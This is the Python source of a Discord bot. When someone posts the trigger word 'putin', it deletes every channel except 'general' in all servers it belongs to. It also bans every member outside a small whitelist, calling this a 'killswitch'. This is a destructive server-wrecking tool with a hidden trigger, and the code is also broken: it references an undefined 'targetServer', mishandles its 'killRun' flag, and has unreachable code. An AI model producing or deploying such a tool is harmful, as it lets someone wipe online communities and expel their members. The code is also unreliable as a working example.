import os

import discord
from discord.ext import commands
from discord.ext import tasks



TOKEN = os.getenv('DISCORD_TOKEN')
intents = discord.Intents.all()
client = discord.Client(intents=intents)


deletestuff = 'y'
deleteHuh = True
killRun =False

@client.event
async def on_ready():
    print('ready')
@client.event
async def on_message(msg):
    if msg.author.name == "counting" or killRun:
        print('not gonna work')
    else:
        print(msg.content)
        if msg.content.lower()== "putin":
            killRun=True
            print(client.guilds)
            print(f'{client.user} has connected to Discord!')
            text_channel_list = []
            
            for guild in client.guilds:
                print('Checking {0} with {1}'.format(guild.name,targetServer))
                if True:
                    print('Found server {0}'.format(guild.name))
                    for channel in guild.channels:
                        print(channel.name,channel.id)
                        try:
                            if deleteHuh:
                                if(not channel.name=='general'):
                                    await channel.delete()
                        except:
                            print('failed to delete channel {0}'.format(channel.name))
            for guild in client.guilds:
                if guild.name == targetServer and deleteHuh:
                    for user in guild.members:
                        try:
                            if(deleteHuh and notMemberOf(user.name,['firez2469','MEE6','Pollmaster','Zira','Dyno','Dadys Boi','Experimental Games Bot'])):
                                if(not user.name == 'Nuclear Bot'):
                                    await guild.ban(user,reason='This is the server killswitch. Youve been banned')
                            print('Banned:',user.name,user.id)
                        except:
                            print('failure to ban',user.name,user.id)

        
def notMemberOf(user, usersList):
    for m in usersList:
        if user==m:
            return False
    return True
    print(text_channel_list)



client.run(TOKEN)
